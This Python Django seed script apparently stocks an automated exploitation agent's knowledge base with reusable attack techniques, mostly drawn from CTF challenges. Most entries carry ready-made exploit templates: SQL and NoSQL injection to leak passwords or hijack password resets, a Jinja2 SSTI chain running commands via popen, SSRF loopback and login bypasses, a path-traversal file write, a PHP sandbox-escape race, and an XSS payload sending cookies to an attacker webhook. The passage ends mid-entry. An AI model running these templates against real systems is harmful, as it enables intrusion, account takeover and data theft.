"""Exploit technique seed — stored as *transferable tricks*, not per-challenge snapshots.

Each technique is one PayloadPattern row (source='technique') + standard schema in attack_metadata.
Schema definition / addition guide: agent/eval/KB_SCHEMA.md.

Usage:
  docker compose exec backend python manage.py seed_techniques
  docker compose exec backend python manage.py seed_techniques --reset
"""
from __future__ import annotations

from django.core.management.base import BaseCommand
from django.db import transaction

from api.embedding_service import (
    EMBEDDING_MODEL,
    embed_documents,
    is_available as embeddings_available,
)
from api.models import PayloadPattern, VulnerabilityEntry


# ── Technique definitions ────────────────────────────────────────────
# Each entry = one generalized transferable trick.
# attack_metadata schema (standard from KB_SCHEMA.md):
#   {
#     "kind": "exploit_technique",
#     "name": str,                    # human-readable
#     "applies_when": str,             # conditions in code/response that make this applicable
#     "prerequisites": [str, ...],     # required conditions
#     "technique_steps_md": str,       # markdown step-by-step
#     "code_template": str,            # parametrized payload template
#     "examples": [                    # known applications
#       {"params": {...}, "notes": str}
#     ],
#     "tags": [str, ...],
#   }

TECHNIQUES: list[dict] = [
    {
        "name": "exif_passthrough_marker",
        "vuln_type": "file_upload_quirk",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["exif", "image", "passthrough", "marker"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "EXIF passthrough — binary marker + JSON payload",
            "applies_when": (
                "The server searches uploaded JPEG EXIF data for magic bytes like `b\"<MARKER>\\x00\"` "
                "and parses the following bytes as JSON (applies to all metadata-inspection type challenges)"
            ),
            "prerequisites": [
                "Server processes EXIF via piexif/PIL — only standard EXIF tags are dumped",
                "Raw bytes append (img.info['exif']) is dropped by PIL save",
                "MakerNote(0x927C) or UserComment(0x9286) are standard free-form binary tags in Exif IFD",
            ],
            "technique_steps_md": (
                "1. piexif.load(image_exif) → exif_dict\n"
                "2. exif_dict['Exif'][piexif.ExifIFD.MakerNote] = b'<MARKER>\\x00<JSON>'\n"
                "   or use piexif.ExifIFD.UserComment (both accept free-form binary)\n"
                "3. piexif.dump(exif_dict) → exif_bytes\n"
                "4. img.save(out, format='JPEG', exif=exif_bytes)\n"
                "5. Server runs exif_data.find(b'<MARKER>\\x00') + len → JSON parse succeeds"
            ),
            "code_template": (
                "import io, piexif\n"
                "from PIL import Image\n"
                "img = Image.new('RGB', (100,100), {color})\n"
                "buf = io.BytesIO(); img.save(buf, format='JPEG')\n"
                "exif_dict = piexif.load(buf.getvalue())\n"
                "exif_dict['Exif'][piexif.ExifIFD.MakerNote] = b'{marker}\\x00' + {json_bytes}\n"
                "out = io.BytesIO()\n"
                "Image.open(io.BytesIO(buf.getvalue())).save(out, format='JPEG',\n"
                "                                            exif=piexif.dump(exif_dict))"
            ),
            "examples": [
                {
                    "params": {
                        "marker": "CUSTOM_MARKER",
                        "json_bytes": "b'{}'",
                        "tag_used": "MakerNote",
                    },
                    "notes": (
                        "UserComment / MakerNote both produce the same effect — server verification "
                        "searches for the marker in the full img.info['exif'] bytes."
                    ),
                },
            ],
            "tags": ["exif", "passthrough", "image_upload"],
        },
    },
    {
        "name": "pdo_emulate_prepare_question_mark_smuggling",
        "vuln_type": "sqli",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["sqli", "pdo", "emulate-prepare", "identifier-injection"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "PDO emulate-prepare `?` smuggling — column/identifier injection",
            "applies_when": (
                "PHP PDO MySQL backend is in emulate prepare mode (default `PDO::ATTR_EMULATE_PREPARES=true`) "
                "and user input is dynamically concatenated into part of the prepared statement SQL string, "
                "allowing injection of an extra `?` token. Input normally goes into a column/identifier/table "
                "name position, but injecting a single `?` makes client-side prepare treat it as another "
                "placeholder → the WHERE clause `?` becomes unbound and our input takes its place."
            ),
            "prerequisites": [
                "PDO + MySQL (ineffective on other backends due to server-side prepare)",
                "ATTR_EMULATE_PREPARES=true (PDO MySQL default)",
                "Dynamically concatenated part is not wrapped in backticks, or input contains backticks to escape",
                "Binding pattern uses only one placeholder: execute([single_value])",
            ],
            "technique_steps_md": (
                "1. Identify: `prepare(\"SELECT $col_param FROM t WHERE x = ?\"); execute([input])` pattern\n"
                "2. Inject fake column name + `?` + comment + null byte into col_param: e.g. `\\?#\\x00`\n"
                "   → SQL: `SELECT \\?#\\0 FROM t WHERE x = ?` (2 `?` tokens total)\n"
                "3. PDO emulate prepare substitutes the first `?` with input as a string:\n"
                "   `SELECT \\<input_value>#\\0 FROM t WHERE x = ?`\n"
                "4. Inside input, close column with backtick and inject arbitrary SELECT subquery + `;#` to comment out trailing SQL\n"
                "5. Response: retrieve results bypassing column-display via `array_values($row)` (CSV/JSON dump)"
            ),
            "code_template": (
                "import requests\n"
                "s = requests.Session()\n"
                "s.post(f'{TARGET}/login.php', data={{'username': USER, 'password': PW}})\n"
                "r = s.get(f'{TARGET}/index.php', params={{\n"
                "    'col': '\\\\?#\\x00',\n"
                "    'name': \"x` FROM (SELECT {leak_column} AS `'x` FROM {leak_table})y;#\",\n"
                    "    'download': '1',  # array_values dump is most robust\n"
                "}})\nprint(r.text)  # CSV: one row per line"
            ),
            "examples": [
                {
                    "params": {
                        "leak_column": "password",
                        "leak_table": "users",
                        "post_exploit": "admin login → further attack chain possible",
                    },
                    "notes": (
                        "ref: slcyber.io PDO research. CSV download option is useful for bypassing column-name "
                        "mapping — displayColumns is determined solely by colParam so the HTML table shows `-`, "
                        "but ?download=1 with array_values dumps the actual SELECT results as-is."
                    ),
                },
            ],
            "tags": ["sqli", "pdo", "emulate-prepare", "identifier-injection"],
        },
    },
    {
        "name": "safe_eval_attribute_chain",
        "vuln_type": "code_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["eval", "ssti", "attribute-chain", "filter-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "safe_eval / Jinja2 attribute chain — filter bypass",
            "applies_when": (
                "User input reaches a sink like eval() / safe_eval() / render_template_string(), and "
                "allowed_globals or the Jinja2 environment exposes os/__builtins__/__class__/__mro__. "
                "Even with BLACKLIST filters (`(`, `)`, `__`, `os`, `import`, etc.), bypass is possible via "
                "attribute access (`a.b.c`), Jinja2 `attr()` filter, `~` string concat, or standard dict access."
            ),
            "prerequisites": [
                "Input reaches a sink that allows attribute access (`a.b`) expressions",
                "Result is exposed in response body/error/debug or side-effects (file read, OOB) are possible",
                "Filter bypass: if '(' is blocked, use dict comprehension or standard data access "
                "(`os.environ`, `request.application.__globals__`)",
                "For Jinja2: `cycler|attr('_'~'_'~'init'~'_'~'_')|attr('_'~'_'~'globals'~'_'~'_')` style chain",
            ],
            "technique_steps_md": (
                "1. Identify sink: `eval(value)`, `safe_eval(value)`, `{{ value }}` (Jinja2 SSTI)\n"
                "2. Map allowed_globals/builtins/class chain:\n"
                "   - Python eval: `os.environ` (simplest), `__builtins__.eval`, "
                "`().__class__.__mro__[1].__subclasses__()`\n"
                "   - Jinja2: `cycler|attr('__init__')|attr('__globals__')|...` or "
                "`config.from_object`, `request.application.__globals__`\n"
                "3. Filter bypass: if '(' is forbidden, use dict access — `os.environ` is a dict so no call needed\n"
                "4. Output: extract from response body debug/error/template render result"
            ),
            "code_template": (
                "# Python eval/safe_eval\n"
                "payload = {expr}  # e.g.: 'os.environ'\n\n"
                "# Jinja2 SSTI BLACKLIST bypass\n"
                "payload = '{{ cycler|attr(\"_~_~init~_~_\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"_~_~globals~_~_\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"get\")(\"o~s\".replace(\"~\",\"\"))'\n"
                "          '|attr(\"po~pen\".replace(\"~\",\"\"))(\"<cmd>\")'\n"
                "          '|attr(\"re~ad\".replace(\"~\",\"\"))() }}'"
            ),
            "examples": [
                {
                    "params": {
                        "sink": "safe_eval (Python)",
                        "expr": "os.environ",
                        "filter_bypassed": ["( blocked", ") blocked", "domain regex must pass"],
                        "output_path": "TRACE /verify response debug field",
                    },
                    "notes": "ImageDescription tag → safe_eval → dict(os.environ) → FLAG env leaked",
                },
                {
                    "transferable_verified": True,
                    "params": {
                        "sink": "Jinja2 render_template_string",
                        "expr": "cycler|attr('_'~'_'~'init'~'_'~'_')|attr(...)|attr('po'~'pen')",
                        "bypass_chars": "~ (concat, + blocked), attr() (. [] blocked), 'o'~'s' (os blocked)",
                        "filter_bypassed": [
                            "BLACKLIST: __ . [ ] + request config os subprocess "
                            "import init globals open read mro class",
                        ],
                        "output_path": "bash `case $(cat /flag|cut -c N) in C) sleep 4 ;; esac` "
                                       "→ POST /write response time (selenium bot blocks until /article load)",
                        "verified_signal": "baseline 2.45s, sleep trigger 5.37s, threshold 4.85s",
                    },
                    "notes": (
                        "OOB not possible (iptables outgoing DROP). Transferability proven — "
                        "Python eval pattern applies directly as a Jinja2 SSTI variant."
                    ),
                },
            ],
            "tags": ["eval", "ssti", "attribute-chain", "filter-bypass"],
        },
    },
    {
        "name": "dyson_multi_request_host_smuggling",
        "vuln_type": "ssrf_loopback_bypass",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["ssrf", "host-header", "multi-request", "ip-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "multiRequest Host-header loopback smuggling",
            "applies_when": (
                "A Node server parses hostname/port from the client-supplied Host header when "
                "fanning out internal requests. The multiRequest feature (splits on ',' in path "
                "fragment then fires http.get for each) uses `req.headers.host.split(':')` to "
                "determine the target. Sending Host: localhost:port makes the server issue a "
                "loopback request to itself → req.socket.remoteAddress=127.0.0.1."
            ),
            "prerequisites": [
                "Server code checks `req.socket.remoteAddress` for IP (127.0.0.1 whitelist, etc.)",
                "dyson-generators or similar framework allowing Host header-based internal redirect",
                "Route goes through multiRequest middleware",
                "multiRequest delimiter (default ',') is known",
            ],
            "technique_steps_md": (
                "1. Identify IP check / internal-only endpoints in the server code.\n"
                "2. Find routes on the same server that go through multiRequest middleware "
                "(dyson-generators enables this on all routes by default).\n"
                "3. Insert a fragment containing ',' in the URL path — after split, each id is used in "
                "path.replace(arr, id) for loopback http.get.\n"
                "4. **Set Host header to `localhost:<internal_port>`** — the server makes an internal "
                "request to itself. That request's remoteAddress = 127.0.0.1.\n"
                "5. Ensure at least one sub-request URL matches the target route by arranging "
                "both sides of `,` as valid paths. Pass query strings by interleaving with `?` "
                "(e.g. `/api/X?guess=V&extra,X?guess=V`).\n"
            ),
            "code_template": (
                "# url template: /<route>?<params>&<pad>,<route_tail>?<params>\n"
                "# Host header must be 'localhost:<internal_port>'\n"
                "import urllib.request\n"
                "req = urllib.request.Request(\n"
                "    'http://<target>/<route>?<params>&extra,<route_tail>?<params>',\n"
                "    headers={'Host': 'localhost:<internal_port>'},\n"
                ")\n"
                "r = urllib.request.urlopen(req, timeout=10)\n"
            ),
            "examples": [
                {
                    "params": {
                        "route": "/api/protectedService",
                        "payload_path": (
                            "/api/protectedService?param=val&extra,protectedService?param=val"
                        ),
                        "host_header": "localhost:3000",
                        "internal_port": 3000,
                        "bypass_target": "req.socket.remoteAddress == 127.0.0.1 check",
                    },
                    "notes": (
                        "multiRequest: path fragment with ',' → range.split(',') → each "
                        "id path.replace → http.get({hostname, port from Host header, path}). "
                        "Host=localhost:3000 → backend loops back to itself, inner handler sees "
                        "remoteAddress=127.0.0.1."
                    ),
                },
            ],
            "tags": ["ssrf", "host-header", "loopback", "ip-bypass"],
        },
    },
    {
        "name": "js_asi_const_overwrite",
        "vuln_type": "js_parser_quirk",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["javascript", "asi", "const", "parser-quirk", "nodejs"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "JS Automatic Semicolon Insertion — const literal overwrite",
            "applies_when": (
                "In JavaScript source, `const X = \"<value>\"` is not followed by a semicolon and the "
                "next line starts with `[a, b] = expr`. ASI interprets `[` after a string literal as "
                "member-access and does not insert a semicolon → the whole thing is parsed as a single "
                "statement `const X = \"...\"[a,b] = expr`. The comma expression `[a,b]` evaluates to `b` → "
                "`\"...\"[b] = expr` is a string prop assignment (silent fail in sloppy mode), and the "
                "assignment expression value = expr. Result: `const X = expr` — const overwritten with attacker-controlled value."
            ),
            "prerequisites": [
                "Analyzable JS source (difficult in blackbox, but possible with source leak/writeup)",
                "Declaration: `const X = \"literal\"` missing semicolon at end",
                "Immediately next line: `[var1, var2] = <attacker_controlled_expr>`",
                "Sloppy mode (strict mode would throw TypeError — must not be strict)",
                "Subsequent comparison: `X == something` where attacker can make expr value equal to one side",
            ],
            "technique_steps_md": (
                "1. Search JS source for `const ... = \"...\"` lines missing a trailing semicolon.\n"
                "2. If the next line matches `[...] = <expr>` pattern, `X` is overwritten with expr.\n"
                "3. Check for comparison (`if (X == target)`) — if attacker can make expr result "
                "equal to target, the check is bypassed.\n"
                "4. Exploit JS loose equality (`==`) coercion — e.g.: `[\"0000\"] == false` → "
                "array→string `\"0000\"` → number `0` ↔ `false` → `0` → true.\n"
                "5. Inject payload into expr source (req.query, req.body, etc.).\n"
            ),
            "code_template": (
                "// vulnerable source pattern:\n"
                "//   const TARGET = \"...\"\n"
                "//   [a, b] = req.query.X !== undefined ? atob(req.query.X).split(\"|\") : [...]\n"
                "// attacker sends X=<base64> such that after atob+split, compared value == initial false/0/null.\n"
                "// example: X=MDAwMA== (atob=\"0000\") → TARGET=[\"0000\"] → [\"0000\"] == false → 0==0 → true\n"
            ),
            "examples": [
                {
                    "params": {
                        "guess": "MDAwMA==",
                        "atob_decoded": "0000",
                        "final_compare": "[\"0000\"] == false  -> \"0000\" == 0 -> true",
                        "overwritten_const": "SecretVariable",
                    },
                    "notes": (
                        "const SecretVariable = \"[REDACTED]\"\\n[param1, param2] = "
                        "req.query.guess !== undefined ? atob(req.query.guess).split(\"|\") : [...] "
                        "→ ASI fails, parsed as one statement. Attacker controls guess → SecretVariable "
                        "itself is overwritten with an array. Comparison operand is false (initial value), "
                        "so array→0 coercion matches."
                    ),
                },
            ],
            "tags": ["javascript", "asi", "const", "type-coercion", "nodejs"],
        },
    },
    # ── NoSQL / path traversal techniques ────────────────────────
    {
        "name": "mongodb_regexp_injection_email_leak",
        "vuln_type": "nosql_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["nosql", "mongodb", "regex", "regexp-injection", "brute-force", "email-leak"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "MongoDB RegExp injection — character-by-character data leak",
            "applies_when": (
                "The server converts user input to `new RegExp(input)` without sanitization and "
                "uses it in MongoDB queries like `findOne({field: regex})`. An attacker can inject regex "
                "metacharacters (`^`, `.*`, `$`, `[a-z]`, etc.) to brute-force existing data one character "
                "at a time. Typically found in registration duplicate checks, search, login, etc."
            ),
            "prerequisites": [
                "User input is passed directly to `new RegExp()` or `{$regex: input}`",
                "Response differentiates between exists/not-exists (e.g. 400 'exists' vs 200 'ok')",
                "Response speed allows brute-force (no rate limiting or loose limits)",
            ],
            "technique_steps_md": (
                "1. Verify regex metacharacters work on the target field: send `^a.*` → check if existing data matches\n"
                "2. Extend prefix one character at a time: `^guide_a.*`, `^guide_ab.*`, ... → if exists response, that character is confirmed\n"
                "3. When no more characters match, the current prefix is the full value\n"
                "4. Handle special characters: escape regex metacharacters (`$`, `*`, `+`, etc.) using character classes `[$]`, `[*]`\n"
                "5. Use extracted value (email, token, etc.) for the next attack stage"
            ),
            "code_template": (
                "import string, requests\n"
                "url = f'{TARGET}/api/auth/register'\n"
                "charset = list(string.ascii_lowercase + string.digits)\n"
                "prefixes = ['^{known_prefix}']\n"
                "while prefixes:\n"
                "    nxt = []\n"
                "    for pfx in prefixes:\n"
                "        for ch in charset:\n"
                "            r = requests.post(url, json={{'email': f'{{pfx}}{{ch}}.*', 'username': ''}})\n"
                "            if '{exists_indicator}' in r.text:\n"
                "                nxt.append(pfx + ch)\n"
                "    prefixes = nxt\n"
                "# if prefixes is empty, the last prefix is the full value"
            ),
            "examples": [
                {
                    "params": {
                        "field": "email",
                        "endpoint": "POST /api/auth/register",
                        "server_code": "User.findOne({email: new RegExp(['^', String(email), '$'].join(''), 'i')})",
                        "exists_indicator": "User already exists",
                        "charset": "a-z0-9",
                    },
                    "notes": (
                        "Email is converted to RegExp in the registration duplicate check. "
                        "Bypass prefix check with `^prefix_` — "
                        "even if the server constructs `'^' + '^prefix_a.*' + '$'` = `^^prefix_a.*$`, "
                        "in JS regex `^^` is equivalent to `^`."
                    ),
                },
            ],
            "tags": ["nosql", "mongodb", "regex", "brute-force"],
        },
    },
    {
        "name": "nosql_operator_injection_token_bypass",
        "vuln_type": "nosql_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["nosql", "mongodb", "operator-injection", "password-reset", "auth-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "MongoDB operator injection ($ne/$gt/$regex) — auth/token bypass",
            "applies_when": (
                "An Express/Node server parses `req.body` as JSON and passes the value directly "
                "to a MongoDB query (`findOne({field: value})`). Since `bodyParser.json()` also parses "
                "objects/arrays, sending `{\"field\": {\"$ne\": null}}` results in "
                "`findOne({field: {$ne: null}})` → matches all documents where token/password/secret "
                "is not null. Applies to password reset, API key verification, 2FA token checks, etc."
            ),
            "prerequisites": [
                "Express bodyParser.json() or similar JSON body parser in use",
                "req.body values are passed to MongoDB queries without sanitization",
                "Documents with non-null values exist in the DB for the target field",
                "Mongoose SchemaType validation is not restricted to String, or can be bypassed",
            ],
            "technique_steps_md": (
                "1. Identify API that sends token/code in the body (e.g. password reset)\n"
                "2. First, trigger normal flow to generate a token for the target account (e.g. send email)\n"
                "3. Send `{\"$ne\": null}` in the token field → matches any user with an existing token\n"
                "   Variants: `{\"$gt\": \"\"}` (all values greater than empty string), `{\"$regex\": \".*\"}` (all values)\n"
                "4. Change password / bypass 2FA / hijack session for the matched user\n"
                "5. Login with the changed credentials"
            ),
            "code_template": (
                "import requests\n"
                "# Step 1: generate reset token for target\n"
                "requests.post(f'{TARGET}/api/auth/reset',\n"
                "              json={{'email': '{target_email}', 'sendMail': False}})\n"
                "# Step 2: bypass token with $ne operator\n"
                "r = requests.post(f'{TARGET}/api/auth/reset',\n"
                "                  json={{'token': {{'$ne': None}}, 'password': '{new_password}'}})\n"
                "# Step 3: login with new password\n"
                "s = requests.Session()\n"
                "s.post(f'{TARGET}/api/auth/login',\n"
                "       json={{'email': '{target_email}', 'password': '{new_password}'}})"
            ),
            "examples": [
                {
                    "params": {
                        "endpoint": "POST /api/auth/reset",
                        "vulnerable_code": "User.findOne({resetPassToken: token})",
                        "payload": '{"token": {"$ne": null}, "password": "newpw"}',
                        "target_role": "privileged user",
                    },
                    "notes": (
                        "resetPassword flow: (1) email→generateToken → sets resetPassToken, "
                        "(2) token→sendResetPassword → User.findOne({resetPassToken: token}). "
                        "sendMail=false generates the token without sending email. "
                        "$ne:null matches any user with an existing token → password reset."
                    ),
                },
            ],
            "tags": ["nosql", "mongodb", "operator-injection", "auth-bypass"],
        },
    },
    {
        "name": "multer_unicode_path_traversal",
        "vuln_type": "path_traversal",
        "category": "exploitation",
        "safety_level": "dangerous",
        "tags": ["path-traversal", "multer", "unicode", "file-upload", "nodejs", "encoding"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Multer latin1→utf8 Unicode path traversal (丯 = /)",
            "applies_when": (
                "Express + multer file upload converts filename via `Buffer.from(name, 'latin1').toString('utf-8')` "
                "and uses the result directly in the `diskStorage` filename callback. "
                "Sending Unicode character `丯` (U+4E2F, UTF-8: E4 B8 AF) via RFC5987 `filename*=UTF-8''...` "
                "encoding causes the latin1→utf8 conversion to produce `/` in the OS path, escaping the upload directory."
            ),
            "prerequisites": [
                "multer diskStorage in use (memory storage does not write files)",
                "filename callback uses `file.originalname` directly without path.basename()",
                "latin1→utf8 conversion logic exists (added in some multer configs for CJK filename support)",
                "Account with upload permissions needed (e.g. guide/admin — combine with separate auth bypass)",
            ],
            "technique_steps_md": (
                "1. Verify the upload endpoint and multer config (diskStorage + filename callback)\n"
                "2. Confirm `Buffer.from(name, 'latin1').toString('utf-8')` conversion is present\n"
                "3. Use RFC5987 encoding in the multipart form:\n"
                "   `Content-Disposition: form-data; name=\"image\"; filename*=UTF-8''..%E4%B8%AF..%E4%B8%AF...target`\n"
                "   `..丯` equals `../` (丯's UTF-8 E4 B8 AF → interpreted as latin1 → utf8 → `/`)\n"
                "4. Traversal depth: repeat `..丯` enough times to escape to root (~13 times)\n"
                "5. Write payload to target path (e.g. `/proc/self/fd/N`, `/tmp/exploit.sh`)\n"
                "6. Follow-up: manipulate Node process memory via /proc/self/fd/ (ROP) or overwrite cron/script"
            ),
            "code_template": (
                "from urllib.parse import quote\n"
                "import requests\n\n"
                "traversal = '..丯' * 13 + '{target_path}'.replace('/', '丯')\n"
                "fn_rfc = \"UTF-8''\" + quote(traversal)\n"
                "boundary = '----Exploit'\n"
                "body = f'--{{boundary}}\\r\\n'\n"
                "body += f'Content-Disposition: form-data; name=\"image\"; filename*={{fn_rfc}}\\r\\n'\n"
                "body += 'Content-Type: application/octet-stream\\r\\n\\r\\n'\n"
                "body = body.encode('utf-8') + {payload_bytes} + f'\\r\\n--{{boundary}}--\\r\\n'.encode('utf-8')\n"
                "r = session.put(f'{{TARGET}}/api/answers/{{uuid}}', data=body,\n"
                "                headers={{'Content-Type': f'multipart/form-data; boundary={{boundary}}'}})"
            ),
            "examples": [
                {
                    "params": {
                        "endpoint": "PUT /api/answers/:uuid (multer upload.single('image'))",
                        "encoding_line": "file.originalname = Buffer.from(file.originalname, 'latin1').toString('utf-8')",
                        "unicode_char": "丯 (U+4E2F)",
                        "traversal_target": "/proc/self/fd/N (ROP) or /tmp/ (arbitrary write)",
                    },
                    "notes": (
                        "After obtaining privileges via auth bypass, use multer upload for path traversal. "
                        "Writing ROP payload to /proc/self/fd/ can crash the Node process → execve possible."
                    ),
                },
            ],
            "tags": ["path-traversal", "multer", "unicode", "file-upload", "encoding"],
        },
    },
    # ── PHP sandbox escape technique ────────────────────────────
    {
        "name": "php_open_basedir_race_pcntl_fork",
        "vuln_type": "open_basedir_bypass",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["php", "open-basedir", "race-condition", "pcntl-fork", "lfi", "sandbox-escape"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "PHP open_basedir bypass — pcntl_fork + rename race on getcwd/MAXPATHLEN",
            "applies_when": (
                "PHP 8.x environment where `open_basedir` is restricted to `/tmp` etc., "
                "`pcntl_fork` is not in `disable_functions` (pcntl extension enabled), "
                "and arbitrary PHP code execution is possible (eval gate, webshell, file upload, etc.). "
                "Even if command execution functions (system/exec/popen) are blocked, "
                "`file_get_contents` can read files outside open_basedir like `/flag.txt`."
            ),
            "prerequisites": [
                "Arbitrary PHP code execution possible (eval, include, etc.)",
                "pcntl_fork() is not in disable_functions",
                "open_basedir includes /tmp (mkdir/rename must be available)",
                "ini_set('open_basedir', ...) callable (not set via php_admin_value)",
            ],
            "technique_steps_md": (
                "1. `chdir('/tmp')` → `mkdir('start/')` → `chdir('start/')`\n"
                "2. Create deep directory with `str_repeat('a' * 249 . '/', N)` so the path length is "
                "just below 4096 (MAXPATHLEN), then `chdir` into it\n"
                "3. `pcntl_fork()` — split into child and parent\n"
                "4. **Child**: repeatedly attempts `ini_set('open_basedir', $cur . ':../')`. "
                "When parent renames the path to exceed 4096, `getcwd()` fails → "
                "`expand_filepath('../')` falls back to `VCWD_OPEN('../')` → returns `../` as-is → "
                "successfully adds `../` to open_basedir\n"
                "5. **Parent**: renames `/tmp/start` to `/tmp/xxxxxx...(250 chars)` and back repeatedly "
                "(toggles path length across the 4096 boundary)\n"
                "6. Child: after race succeeds, `chdir('/tmp'); chdir('../')` → escapes open_basedir\n"
                "7. `file_get_contents('/flag.txt')` to read the flag"
            ),
            "code_template": (
                "chdir('/tmp');\n"
                "@mkdir('start/');\n"
                "chdir('start/');\n"
                "$cur_dir_len = strlen(getcwd());\n"
                "$depth = str_repeat(str_repeat('a', 249).'/', 16 - floor($cur_dir_len / 250));\n"
                "@mkdir($depth, 0755, true);\n"
                "chdir($depth);\n"
                "$pid = pcntl_fork();\n"
                "if($pid == 0) {\n"
                "  for ($i=0; $i<25; $i++) {\n"
                "    usleep(300);\n"
                "    ini_set('open_basedir', ini_get('open_basedir').':../');\n"
                "  }\n"
                "  chdir('/tmp'); chdir('../');\n"
                "  echo file_get_contents('{flag_path}');\n"
                "} else {\n"
                "  chdir('/tmp');\n"
                "  for ($i=0; $i<30000; $i++) {\n"
                "    usleep(30);\n"
                "    @rename('start', str_repeat('x', 250));\n"
                "    @rename(str_repeat('x', 250), 'start');\n"
                "  }\n"
                "}"
            ),
            "examples": [
                {
                    "params": {
                        "open_basedir": "/var/www/html:/tmp",
                        "disabled_functions": "system,exec,shell_exec,popen,proc_open,passthru,... (pcntl_fork excluded)",
                        "flag_path": "/flag.txt",
                        "eval_gate": "?key=KEY&code=<php_code>",
                        "race_success_rate": "high success rate on first attempt",
                    },
                    "notes": (
                        "Targets PHP 8.4-cli. Bug in expand_filepath(): VCWD_GETCWD → getcwd() "
                        "fails when exceeding MAXPATHLEN(4096), fallback VCWD_OPEN(filepath) "
                        "succeeds and returns filepath as realpath as-is. "
                        "Triggered via race condition."
                    ),
                },
            ],
            "tags": ["php", "open-basedir", "race-condition", "pcntl-fork", "sandbox-escape"],
        },
    },
    # ── Auth bypass / XSS chain techniques ─────────────────────
    {
        "name": "mysql_object_injection_auth_bypass",
        "vuln_type": "sqli",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["mysql", "object-injection", "auth-bypass", "type-confusion", "nodejs"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "MySQL object injection auth bypass — JSON object as parameterized query value",
            "applies_when": (
                "A Node.js app uses mysql/mysql2 driver with parameterized queries but does not "
                "validate the type of user input (req.body.password, etc.), allowing JSON objects to be "
                "passed directly. With Express's express.json() middleware enabled, nested objects like "
                "{ \"password\": { \"password\": 1 } } are parsed as-is."
            ),
            "prerequisites": [
                "Node.js + mysql/mysql2 driver in use",
                "express.json() middleware enabled (Content-Type: application/json)",
                "User input passed to parameterized query without type validation",
                "Query like SELECT * FROM users WHERE username = ? AND password = ?",
            ],
            "technique_steps_md": (
                "1. Identify target login endpoint: `POST /auth/login` + `Content-Type: application/json`\n"
                "2. Pass object in password field: `{\"username\": \"admin\", \"password\": {\"password\": 1}}`\n"
                "3. mysql2 driver serializes the object to `` `password` = 1 ``\n"
                "4. Final SQL: `WHERE username = 'admin' AND password = \\`password\\` = 1`\n"
                "5. `password = \\`password\\`` → column compared to itself → always 1 (true)\n"
                "6. `1 = 1` → true → authentication bypass successful"
            ),
            "code_template": (
                "import requests\n"
                "r = requests.post('{url}/auth/login',\n"
                "    json={'username': '{target_user}', 'password': {'password': 1}})\n"
                "token = r.json().get('token')\n"
                "# use token to access admin functionality"
            ),
            "examples": [
                {
                    "params": {
                        "driver": "mysql2",
                        "query": "SELECT * FROM users WHERE username = ? AND password = ?",
                        "payload": '{"username": "admin", "password": {"password": 1}}',
                    },
                    "notes": (
                        "mysql2 driver serializes objects to `col = val` form. "
                        "password = `password` = 1 becomes (password = password) = 1 → 1 = 1 → true. "
                        "This technique bypasses even parameterized queries, so "
                        "typeof validation or input schema validation is essential."
                    ),
                },
            ],
            "tags": ["mysql", "object-injection", "auth-bypass", "type-confusion", "nodejs", "express"],
        },
    },
    {
        "name": "dompurify_mxss_custom_element_safe_for_templates",
        "vuln_type": "xss",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["xss", "mxss", "dompurify", "custom-element", "mutation-xss", "sanitizer-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "DOMPurify mXSS bypass via custom elements + SAFE_FOR_TEMPLATES config",
            "applies_when": (
                "DOMPurify is configured with SAFE_FOR_TEMPLATES: true and CUSTOM_ELEMENT_HANDLING "
                "(tagNameCheck: /^custom-/). When sanitized HTML is assigned to innerHTML, "
                "DOM mutation can cause event handlers to survive."
            ),
            "prerequisites": [
                "DOMPurify with SAFE_FOR_TEMPLATES: true",
                "CUSTOM_ELEMENT_HANDLING with tagNameCheck for custom- prefix",
                "Sanitize output is assigned to innerHTML",
                "CSP allows inline script/event handlers (unsafe-inline, etc.)",
            ],
            "technique_steps_md": (
                "1. Check DOMPurify config: `SAFE_FOR_TEMPLATES`, `CUSTOM_ELEMENT_HANDLING`\n"
                "2. Construct mutation XSS payload: combine `<math>`, `<table>`, `<custom-*>` tags to "
                "induce structural changes during DOM parsing\n"
                "3. Use template syntax like `<! \\${` inside `<style>` tag to confuse the parser\n"
                "4. Insert event handler inside attribute via `<custom-b id=\">...\">` form\n"
                "5. After sanitize, innerHTML assignment triggers DOM reparse → `<img onerror=...>` activates\n"
                "6. XSS fires: `location.href='...' + document.cookie`"
            ),
            "code_template": (
                '<math><custom-test><mi><li><table><custom-test><li></li></custom-test>'
                '<a><style><! \\${</style>}<custom-b id=">'
                "<img src onerror='location.href=`{webhook}/?token=`+document.cookie'>"
                '">test</custom-b></a></table></li></mi></custom-test></math>'
            ),
            "examples": [
                {
                    "params": {
                        "dompurify_config": "SAFE_FOR_TEMPLATES: true, CUSTOM_ELEMENT_HANDLING: {tagNameCheck: /^custom-/}",
                        "sink": "innerHTML assignment in admin page",
                        "delivery": "base64 encoded in URL query parameter",
                    },
                    "notes": (
                        "When DOMPurify's SAFE_FOR_TEMPLATES mode allows custom elements, "
                        "mutation XSS is possible by combining math/table context switching with style tags. "
                        "When server-side sanitized HTML is re-parsed via innerHTML on the client, "
                        "the DOM structure changes and event handlers become active."
                    ),
                },
            ],
            "tags": ["xss", "mxss", "dompurify", "custom-element", "mutation-xss", "sanitizer-bypass"],
        },
    },
    {
        "name": "csp_split_brain_admin_unsafe_inline",
